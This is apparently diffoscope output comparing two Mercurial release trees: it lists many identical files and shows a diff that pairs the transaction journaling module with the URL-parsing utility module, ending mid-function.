### Comparing `mercurial-6.4.5/mercurial/templates/static/followlines.js` & `mercurial-6.4rc0/mercurial/templates/static/followlines.js`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/static/hgicon.png` & `mercurial-6.4rc0/mercurial/templates/static/hgicon.png`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/static/hglogo.png` & `mercurial-6.4rc0/mercurial/templates/static/hglogo.png`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/static/mercurial.js` & `mercurial-6.4rc0/mercurial/templates/static/mercurial.js`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/static/style-extra-coal.css` & `mercurial-6.4rc0/mercurial/templates/static/style-extra-coal.css`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/static/style-gitweb.css` & `mercurial-6.4rc0/mercurial/templates/static/style-gitweb.css`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/static/style-monoblue.css` & `mercurial-6.4rc0/mercurial/templates/static/style-monoblue.css`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/static/style-paper.css` & `mercurial-6.4rc0/mercurial/templates/static/style-paper.css`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templates/static/style.css` & `mercurial-6.4rc0/mercurial/templates/static/style.css`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/templateutil.py` & `mercurial-6.4rc0/mercurial/templateutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/testing/__init__.py` & `mercurial-6.4rc0/mercurial/testing/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/testing/revlog.py` & `mercurial-6.4rc0/mercurial/testing/revlog.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/testing/storage.py` & `mercurial-6.4rc0/mercurial/testing/storage.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/LICENSE` & `mercurial-6.4rc0/mercurial/thirdparty/attr/LICENSE`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/__init__.py` & `mercurial-6.4rc0/mercurial/thirdparty/attr/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/__init__.pyi` & `mercurial-6.4rc0/mercurial/thirdparty/attr/__init__.pyi`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/_cmp.py` & `mercurial-6.4rc0/mercurial/thirdparty/attr/_cmp.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/_compat.py` & `mercurial-6.4rc0/mercurial/thirdparty/attr/_compat.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/_config.py` & `mercurial-6.4rc0/mercurial/thirdparty/attr/_config.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/_funcs.py` & `mercurial-6.4rc0/mercurial/thirdparty/attr/_funcs.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/_make.py` & `mercurial-6.4rc0/mercurial/thirdparty/attr/_make.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/_next_gen.py` & `mercurial-6.4rc0/mercurial/thirdparty/attr/_next_gen.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/_version_info.py` & `mercurial-6.4rc0/mercurial/thirdparty/attr/_version_info.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/converters.py` & `mercurial-6.4rc0/mercurial/thirdparty/attr/converters.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/exceptions.py` & `mercurial-6.4rc0/mercurial/thirdparty/attr/exceptions.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/exceptions.pyi` & `mercurial-6.4rc0/mercurial/thirdparty/attr/exceptions.pyi`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/filters.py` & `mercurial-6.4rc0/mercurial/thirdparty/attr/filters.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/setters.py` & `mercurial-6.4rc0/mercurial/thirdparty/attr/setters.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/setters.pyi` & `mercurial-6.4rc0/mercurial/thirdparty/attr/setters.pyi`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/validators.py` & `mercurial-6.4rc0/mercurial/thirdparty/attr/validators.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/attr/validators.pyi` & `mercurial-6.4rc0/mercurial/thirdparty/attr/validators.pyi`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/cbor/.travis.yml` & `mercurial-6.4rc0/mercurial/thirdparty/cbor/.travis.yml`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/cbor/LICENSE.txt` & `mercurial-6.4rc0/mercurial/thirdparty/cbor/LICENSE.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/cbor/README.rst` & `mercurial-6.4rc0/mercurial/thirdparty/cbor/README.rst`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/cbor/cbor2/compat.py` & `mercurial-6.4rc0/mercurial/thirdparty/cbor/cbor2/compat.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/cbor/cbor2/decoder.py` & `mercurial-6.4rc0/mercurial/thirdparty/cbor/cbor2/decoder.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/cbor/cbor2/encoder.py` & `mercurial-6.4rc0/mercurial/thirdparty/cbor/cbor2/encoder.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/cbor/cbor2/types.py` & `mercurial-6.4rc0/mercurial/thirdparty/cbor/cbor2/types.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/sha1dc/LICENSE.txt` & `mercurial-6.4rc0/mercurial/thirdparty/sha1dc/LICENSE.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/sha1dc/README.md` & `mercurial-6.4rc0/mercurial/thirdparty/sha1dc/README.md`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/sha1dc/cext.c` & `mercurial-6.4rc0/mercurial/thirdparty/sha1dc/cext.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/sha1dc/lib/sha1.c` & `mercurial-6.4rc0/mercurial/thirdparty/sha1dc/lib/sha1.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/sha1dc/lib/sha1.h` & `mercurial-6.4rc0/mercurial/thirdparty/sha1dc/lib/sha1.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/sha1dc/lib/ubc_check.c` & `mercurial-6.4rc0/mercurial/thirdparty/sha1dc/lib/ubc_check.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/sha1dc/lib/ubc_check.h` & `mercurial-6.4rc0/mercurial/thirdparty/sha1dc/lib/ubc_check.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/xdiff/xdiff.h` & `mercurial-6.4rc0/mercurial/thirdparty/xdiff/xdiff.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/xdiff/xdiffi.c` & `mercurial-6.4rc0/mercurial/thirdparty/xdiff/xdiffi.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/xdiff/xdiffi.h` & `mercurial-6.4rc0/mercurial/thirdparty/xdiff/xdiffi.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/xdiff/xinclude.h` & `mercurial-6.4rc0/mercurial/thirdparty/xdiff/xinclude.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/xdiff/xmacros.h` & `mercurial-6.4rc0/mercurial/thirdparty/xdiff/xmacros.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/xdiff/xprepare.c` & `mercurial-6.4rc0/mercurial/thirdparty/xdiff/xprepare.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/xdiff/xprepare.h` & `mercurial-6.4rc0/mercurial/thirdparty/xdiff/xprepare.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/xdiff/xtypes.h` & `mercurial-6.4rc0/mercurial/thirdparty/xdiff/xtypes.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/xdiff/xutils.c` & `mercurial-6.4rc0/mercurial/thirdparty/xdiff/xutils.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/xdiff/xutils.h` & `mercurial-6.4rc0/mercurial/thirdparty/xdiff/xutils.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/LICENSE.txt` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/LICENSE.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/__init__.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/_compat.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/_compat.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/_flatten.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/_flatten.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/_zope_interface_coptimizations.c` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/_zope_interface_coptimizations.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/adapter.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/adapter.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/advice.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/advice.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/common/idatetime.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/common/idatetime.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/common/interfaces.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/common/interfaces.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/common/mapping.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/common/mapping.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/common/sequence.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/common/sequence.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/declarations.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/declarations.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/document.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/document.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/exceptions.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/exceptions.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/interface.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/interface.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/interfaces.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/interfaces.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/registry.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/registry.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/ro.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/ro.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/thirdparty/zope/interface/verify.py` & `mercurial-6.4rc0/mercurial/thirdparty/zope/interface/verify.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/transaction.py` & `mercurial-6.4rc0/mercurial/utils/urlutil.py`

 * *Files 25% similar despite different names*

```diff
@@ -1,965 +1,962 @@
-# transaction.py - simple journaling scheme for mercurial
+# utils.urlutil - code related to [paths] management
 #
-# This transaction scheme is intended to gracefully handle program
-# errors and interruptions. More serious failures like system crashes
-# can be recovered with an fsck-like tool. As the whole repository is
-# effectively log-structured, this should amount to simply truncating
-# anything that isn't referenced in the changelog.
-#
-# Copyright 2005, 2006 Olivia Mackall <olivia@selenic.com>
+# Copyright 2005-2023 Olivia Mackall <olivia@selenic.com> and others
 #
 # This software may be used and distributed according to the terms of the
 # GNU General Public License version 2 or any later version.
-
-import errno
 import os
+import re as remod
+import socket
 
-from .i18n import _
-from . import (
+from ..i18n import _
+from ..pycompat import (
+    getattr,
+    setattr,
+)
+from .. import (
+    encoding,
     error,
     pycompat,
-    util,
+    urllibcompat,
 )
-from .utils import stringutil
 
-version = 2
+from . import (
+    stringutil,
+)
 
-GEN_GROUP_ALL = b'all'
-GEN_GROUP_PRE_FINALIZE = b'prefinalize'
-GEN_GROUP_POST_FINALIZE = b'postfinalize'
+from ..revlogutils import (
+    constants as revlog_constants,
+)
 
 
-def active(func):
-    def _active(self, *args, **kwds):
-        if self._count == 0:
-            raise error.ProgrammingError(
-                b'cannot use transaction when it is already committed/aborted'
-            )
-        return func(self, *args, **kwds)
+if pycompat.TYPE_CHECKING:
+    from typing import (
+        Union,
+    )
 
-    return _active
+urlreq = urllibcompat.urlreq
 
 
-UNDO_BACKUP = b'%s.backupfiles'
+def getport(port):
+    # type: (Union[bytes, int]) -> int
+    """Return the port for a given network service.
 
-UNDO_FILES_MAY_NEED_CLEANUP = [
-    # legacy entries that might exists on disk from previous version:
-    (b'store', b'%s.narrowspec'),
-    (b'plain', b'%s.narrowspec.dirstate'),
-    (b'plain', b'%s.branch'),
-    (b'plain', b'%s.bookmarks'),
-    (b'store', b'%s.phaseroots'),
-    (b'plain', b'%s.dirstate'),
-    # files actually in uses today:
-    (b'plain', b'%s.desc'),
-    # Always delete undo last to make sure we detect that a clean up is needed if
-    # the process is interrupted.
-    (b'store', b'%s'),
-]
+    If port is an integer, it's returned as is. If it's a string, it's
+    looked up using socket.getservbyname(). If there's no matching
+    service, error.Abort is raised.
+    """
+    try:
+        return int(port)
+    except ValueError:
+        pass
 
+    try:
+        return socket.getservbyname(pycompat.sysstr(port))
+    except socket.error:
+        raise error.Abort(
+            _(b"no port number associated with service '%s'") % port
+        )
 
-def cleanup_undo_files(report, vfsmap, undo_prefix=b'undo'):
-    """remove "undo" files used by the rollback logic
 
-    This is useful to prevent rollback running in situation were it does not
-    make sense. For example after a strip.
-    """
-    backup_listing = UNDO_BACKUP % undo_prefix
+class url:
+    r"""Reliable URL parser.
 
-    backup_entries = []
-    undo_files = []
-    svfs = vfsmap[b'store']
-    try:
-        with svfs(backup_listing) as f:
-            backup_entries = read_backup_files(report, f)
-    except OSError as e:
-        if e.errno != errno.ENOENT:
-            msg = _(b'could not read %s: %s\n')
-            msg %= (svfs.join(backup_listing), stringutil.forcebytestr(e))
-            report(msg)
-
-    for location, f, backup_path, c in backup_entries:
-        if location in vfsmap and backup_path:
-            undo_files.append((vfsmap[location], backup_path))
-
-    undo_files.append((svfs, backup_listing))
-    for location, undo_path in UNDO_FILES_MAY_NEED_CLEANUP:
-        undo_files.append((vfsmap[location], undo_path % undo_prefix))
-    for undovfs, undofile in undo_files:
-        try:
-            undovfs.unlink(undofile)
-        except OSError as e:
-            if e.errno != errno.ENOENT:
-                msg = _(b'error removing %s: %s\n')
-                msg %= (undovfs.join(undofile), stringutil.forcebytestr(e))
-                report(msg)
-
-
-def _playback(
-    journal,
-    report,
-    opener,
-    vfsmap,
-    entries,
-    backupentries,
-    unlink=True,
-    checkambigfiles=None,
-):
-    """rollback a transaction :
-    - truncate files that have been appended to
-    - restore file backups
-    - delete temporary files
+    This parses URLs and provides attributes for the following
+    components:
+
+    <scheme>://<user>:<passwd>@<host>:<port>/<path>?<query>#<fragment>
+
+    Missing components are set to None. The only exception is
+    fragment, which is set to '' if present but empty.
+
+    If parsefragment is False, fragment is included in query. If
+    parsequery is False, query is included in path. If both are
+    False, both fragment and query are included in path.
+
+    See http://www.ietf.org/rfc/rfc2396.txt for more information.
+
+    Note that for backward compatibility reasons, bundle URLs do not
+    take host names. That means 'bundle://../' has a path of '../'.
+
+    Examples:
+
+    >>> url(b'http://www.ietf.org/rfc/rfc2396.txt')
+    <url scheme: 'http', host: 'www.ietf.org', path: 'rfc/rfc2396.txt'>
+    >>> url(b'ssh://[::1]:2200//home/joe/repo')
+    <url scheme: 'ssh', host: '[::1]', port: '2200', path: '/home/joe/repo'>
+    >>> url(b'file:///home/joe/repo')
+    <url scheme: 'file', path: '/home/joe/repo'>
+    >>> url(b'file:///c:/temp/foo/')
+    <url scheme: 'file', path: 'c:/temp/foo/'>
+    >>> url(b'bundle:foo')
+    <url scheme: 'bundle', path: 'foo'>
+    >>> url(b'bundle://../foo')
+    <url scheme: 'bundle', path: '../foo'>
+    >>> url(br'c:\foo\bar')
+    <url path: 'c:\\foo\\bar'>
+    >>> url(br'\\blah\blah\blah')
+    <url path: '\\\\blah\\blah\\blah'>
+    >>> url(br'\\blah\blah\blah#baz')
+    <url path: '\\\\blah\\blah\\blah', fragment: 'baz'>
+    >>> url(br'file:///C:\users\me')
+    <url scheme: 'file', path: 'C:\\users\\me'>
+
+    Authentication credentials:
+
+    >>> url(b'ssh://joe:xyz@x/repo')
+    <url scheme: 'ssh', user: 'joe', passwd: 'xyz', host: 'x', path: 'repo'>
+    >>> url(b'ssh://joe@x/repo')
+    <url scheme: 'ssh', user: 'joe', host: 'x', path: 'repo'>
+
+    Query strings and fragments:
+
+    >>> url(b'http://host/a?b#c')
+    <url scheme: 'http', host: 'host', path: 'a', query: 'b', fragment: 'c'>
+    >>> url(b'http://host/a?b#c', parsequery=False, parsefragment=False)
+    <url scheme: 'http', host: 'host', path: 'a?b#c'>
+
+    Empty path:
+
+    >>> url(b'')
+    <url path: ''>
+    >>> url(b'#a')
+    <url path: '', fragment: 'a'>
+    >>> url(b'http://host/')
+    <url scheme: 'http', host: 'host', path: ''>
+    >>> url(b'http://host/#a')
+    <url scheme: 'http', host: 'host', path: '', fragment: 'a'>
+
+    Only scheme:
+
+    >>> url(b'http:')
+    <url scheme: 'http'>
     """
-    backupfiles = []
 
-    def restore_one_backup(vfs, f, b, checkambig):
-        filepath = vfs.join(f)
-        backuppath = vfs.join(b)
-        try:
-            util.copyfile(backuppath, filepath, checkambig=checkambig)
-            backupfiles.append((vfs, b))
-        except IOError as exc:
-            e_msg = stringutil.forcebytestr(exc)
-            report(_(b"failed to recover %s (%s)\n") % (f, e_msg))
-            raise
-
-    # gather all backup files that impact the store
-    # (we need this to detect files that are both backed up and truncated)
-    store_backup = {}
-    for entry in backupentries:
-        location, file_path, backup_path, cache = entry
-        vfs = vfsmap[location]
-        is_store = vfs.join(b'') == opener.join(b'')
-        if is_store and file_path and backup_path:
-            store_backup[file_path] = entry
-    copy_done = set()
-
-    # truncate all file `f` to offset `o`
-    for f, o in sorted(dict(entries).items()):
-        # if we have a backup for `f`, we should restore it first and truncate
-        # the restored file
-        bck_entry = store_backup.get(f)
-        if bck_entry is not None:
-            location, file_path, backup_path, cache = bck_entry
-            checkambig = False
-            if checkambigfiles:
-                checkambig = (file_path, location) in checkambigfiles
-            restore_one_backup(opener, file_path, backup_path, checkambig)
-            copy_done.add(bck_entry)
-        # truncate the file to its pre-transaction size
-        if o or not unlink:
-            checkambig = checkambigfiles and (f, b'') in checkambigfiles
-            try:
-                fp = opener(f, b'a', checkambig=checkambig)
-                if fp.tell() < o:
-                    raise error.Abort(
-                        _(
-                            b"attempted to truncate %s to %d bytes, but it was "
-                            b"already %d bytes\n"
-                        )
-                        % (f, o, fp.tell())
-                    )
-                fp.truncate(o)
-                fp.close()
-            except IOError:
-                report(_(b"failed to truncate %s\n") % f)
-                raise
+    _safechars = b"!~*'()+"
+    _safepchars = b"/!~*'()+:\\"
+    _matchscheme = remod.compile(b'^[a-zA-Z0-9+.\\-]+:').match
+
+    def __init__(self, path, parsequery=True, parsefragment=True):
+        # type: (bytes, bool, bool) -> None
+        # We slowly chomp away at path until we have only the path left
+        self.scheme = self.user = self.passwd = self.host = None
+        self.port = self.path = self.query = self.fragment = None
+        self._localpath = True
+        self._hostport = b''
+        self._origpath = path
+
+        if parsefragment and b'#' in path:
+            path, self.fragment = path.split(b'#', 1)
+
+        # special case for Windows drive letters and UNC paths
+        if hasdriveletter(path) or path.startswith(b'\\\\'):
+            self.path = path
+            return
+
+        # For compatibility reasons, we can't handle bundle paths as
+        # normal URLS
+        if path.startswith(b'bundle:'):
+            self.scheme = b'bundle'
+            path = path[7:]
+            if path.startswith(b'//'):
+                path = path[2:]
+            self.path = path
+            return
+
+        if self._matchscheme(path):
+            parts = path.split(b':', 1)
+            if parts[0]:
+                self.scheme, path = parts
+                self._localpath = False
+
+        if not path:
+            path = None
+            if self._localpath:
+                self.path = b''
+                return
         else:
-            # delete empty file
-            try:
-                opener.unlink(f)
-            except FileNotFoundError:
-                pass
-    # restore backed up files and clean up temporary files
-    for entry in backupentries:
-        if entry in copy_done:
-            continue
-        l, f, b, c = entry
-        if l not in vfsmap and c:
-            report(b"couldn't handle %s: unknown cache location %s\n" % (b, l))
-        vfs = vfsmap[l]
-        try:
-            checkambig = checkambigfiles and (f, l) in checkambigfiles
-            if f and b:
-                restore_one_backup(vfs, f, b, checkambig)
-            else:
-                target = f or b
-                try:
-                    vfs.unlink(target)
-                except FileNotFoundError:
-                    # This is fine because
-                    #
-                    # either we are trying to delete the main file, and it is
-                    # already deleted.
-                    #
-                    # or we are trying to delete a temporary file and it is
-                    # already deleted.
-                    #
-                    # in both case, our target result (delete the file) is
-                    # already achieved.
-                    pass
-        except (IOError, OSError, error.Abort):
-            if not c:
-                raise
-
-    # cleanup transaction state file and the backups file
-    backuppath = b"%s.backupfiles" % journal
-    if opener.exists(backuppath):
-        opener.unlink(backuppath)
-    opener.unlink(journal)
-    try:
-        for vfs, f in backupfiles:
-            if vfs.exists(f):
-                vfs.unlink(f)
-    except (IOError, OSError, error.Abort):
-        # only pure backup file remains, it is sage to ignore any error
-        pass
+            if self._localpath:
+                self.path = path
+                return
 
+            if parsequery and b'?' in path:
+                path, self.query = path.split(b'?', 1)
+                if not path:
+                    path = None
+                if not self.query:
+                    self.query = None
+
+            # // is required to specify a host/authority
+            if path and path.startswith(b'//'):
+                parts = path[2:].split(b'/', 1)
+                if len(parts) > 1:
+                    self.host, path = parts
+                else:
+                    self.host = parts[0]
+                    path = None
+                if not self.host:
+                    self.host = None
+                    # path of file:///d is /d
+                    # path of file:///d:/ is d:/, not /d:/
+                    if path and not hasdriveletter(path):
+                        path = b'/' + path
+
+            if self.host and b'@' in self.host:
+                self.user, self.host = self.host.rsplit(b'@', 1)
+                if b':' in self.user:
+                    self.user, self.passwd = self.user.split(b':', 1)
+                if not self.host:
+                    self.host = None
+
+            # Don't split on colons in IPv6 addresses without ports
+            if (
+                self.host
+                and b':' in self.host
+                and not (
+                    self.host.startswith(b'[') and self.host.endswith(b']')
+                )
+            ):
+                self._hostport = self.host
+                self.host, self.port = self.host.rsplit(b':', 1)
+                if not self.host:
+                    self.host = None
+
+            if (
+                self.host
+                and self.scheme == b'file'
+                and self.host not in (b'localhost', b'127.0.0.1', b'[::1]')
+            ):
+                raise error.Abort(
+                    _(b'file:// URLs can only refer to localhost')
+                )
 
-class transaction(util.transactional):
-    def __init__(
-        self,
-        report,
-        opener,
-        vfsmap,
-        journalname,
-        undoname=None,
-        after=None,
-        createmode=None,
-        validator=None,
-        releasefn=None,
-        checkambigfiles=None,
-        name='<unnamed>',
-    ):
-        """Begin a new transaction
+        self.path = path
 
-        Begins a new transaction that allows rolling back writes in the event of
-        an exception.
+        # leave the query string escaped
+        for a in (b'user', b'passwd', b'host', b'port', b'path', b'fragment'):
+            v = getattr(self, a)
+            if v is not None:
+                setattr(self, a, urlreq.unquote(v))
+
+    def copy(self):
+        u = url(b'temporary useless value')
+        u.path = self.path
+        u.scheme = self.scheme
+        u.user = self.user
+        u.passwd = self.passwd
+        u.host = self.host
+        u.port = self.port
+        u.query = self.query
+        u.fragment = self.fragment
+        u._localpath = self._localpath
+        u._hostport = self._hostport
+        u._origpath = self._origpath
+        return u
 
-        * `after`: called after the transaction has been committed
-        * `createmode`: the mode of the journal file that will be created
-        * `releasefn`: called after releasing (with transaction and result)
-
-        `checkambigfiles` is a set of (path, vfs-location) tuples,
-        which determine whether file stat ambiguity should be avoided
-        for corresponded files.
+    @encoding.strmethod
+    def __repr__(self):
+        attrs = []
+        for a in (
+            b'scheme',
+            b'user',
+            b'passwd',
+            b'host',
+            b'port',
+            b'path',
+            b'query',
+            b'fragment',
+        ):
+            v = getattr(self, a)
+            if v is not None:
+                attrs.append(b'%s: %r' % (a, pycompat.bytestr(v)))
+        return b'<url %s>' % b', '.join(attrs)
+
+    def __bytes__(self):
+        r"""Join the URL's components back into a URL string.
+
+        Examples:
+
+        >>> bytes(url(b'http://user:pw@host:80/c:/bob?fo:oo#ba:ar'))
+        'http://user:pw@host:80/c:/bob?fo:oo#ba:ar'
+        >>> bytes(url(b'http://user:pw@host:80/?foo=bar&baz=42'))
+        'http://user:pw@host:80/?foo=bar&baz=42'
+        >>> bytes(url(b'http://user:pw@host:80/?foo=bar%3dbaz'))
+        'http://user:pw@host:80/?foo=bar%3dbaz'
+        >>> bytes(url(b'ssh://user:pw@[::1]:2200//home/joe#'))
+        'ssh://user:pw@[::1]:2200//home/joe#'
+        >>> bytes(url(b'http://localhost:80//'))
+        'http://localhost:80//'
+        >>> bytes(url(b'http://localhost:80/'))
+        'http://localhost:80/'
+        >>> bytes(url(b'http://localhost:80'))
+        'http://localhost:80/'
+        >>> bytes(url(b'bundle:foo'))
+        'bundle:foo'
+        >>> bytes(url(b'bundle://../foo'))
+        'bundle:../foo'
+        >>> bytes(url(b'path'))
+        'path'
+        >>> bytes(url(b'file:///tmp/foo/bar'))
+        'file:///tmp/foo/bar'
+        >>> bytes(url(b'file:///c:/tmp/foo/bar'))
+        'file:///c:/tmp/foo/bar'
+        >>> print(url(br'bundle:foo\bar'))
+        bundle:foo\bar
+        >>> print(url(br'file:///D:\data\hg'))
+        file:///D:\data\hg
         """
-        self._count = 1
-        self._usages = 1
-        self._report = report
-        # a vfs to the store content
-        self._opener = opener
-        # a map to access file in various {location -> vfs}
-        vfsmap = vfsmap.copy()
-        vfsmap[b''] = opener  # set default value
-        self._vfsmap = vfsmap
-        self._after = after
-        self._offsetmap = {}
-        self._newfiles = set()
-        self._journal = journalname
-        self._journal_files = []
-        self._undoname = undoname
-        self._queue = []
-        # A callback to do something just after releasing transaction.
-        if releasefn is None:
-            releasefn = lambda tr, success: None
-        self._releasefn = releasefn
-
-        self._checkambigfiles = set()
-        if checkambigfiles:
-            self._checkambigfiles.update(checkambigfiles)
-
-        self._names = [name]
-
-        # A dict dedicated to precisely tracking the changes introduced in the
-        # transaction.
-        self.changes = {}
-
-        # a dict of arguments to be passed to hooks
-        self.hookargs = {}
-        self._file = opener.open(self._journal, b"w+")
-
-        # a list of ('location', 'path', 'backuppath', cache) entries.
-        # - if 'backuppath' is empty, no file existed at backup time
-        # - if 'path' is empty, this is a temporary transaction file
-        # - if 'location' is not empty, the path is outside main opener reach.
-        #   use 'location' value as a key in a vfsmap to find the right 'vfs'
-        # (cache is currently unused)
-        self._backupentries = []
-        self._backupmap = {}
-        self._backupjournal = b"%s.backupfiles" % self._journal
-        self._backupsfile = opener.open(self._backupjournal, b'w')
-        self._backupsfile.write(b'%d\n' % version)
-        # the set of temporary files
-        self._tmp_files = set()
-
-        if createmode is not None:
-            opener.chmod(self._journal, createmode & 0o666)
-            opener.chmod(self._backupjournal, createmode & 0o666)
-
-        # hold file generations to be performed on commit
-        self._filegenerators = {}
-        # hold callback to write pending data for hooks
-        self._pendingcallback = {}
-        # True is any pending data have been written ever
-        self._anypending = False
-        # holds callback to call when writing the transaction
-        self._finalizecallback = {}
-        # holds callback to call when validating the transaction
-        # should raise exception if anything is wrong
-        self._validatecallback = {}
-        if validator is not None:
-            self._validatecallback[b'001-userhooks'] = validator
-        # hold callback for post transaction close
-        self._postclosecallback = {}
-        # holds callbacks to call during abort
-        self._abortcallback = {}
+        if self._localpath:
+            s = self.path
+            if self.scheme == b'bundle':
+                s = b'bundle:' + s
+            if self.fragment:
+                s += b'#' + self.fragment
+            return s
+
+        s = self.scheme + b':'
+        if self.user or self.passwd or self.host:
+            s += b'//'
+        elif self.scheme and (
+            not self.path
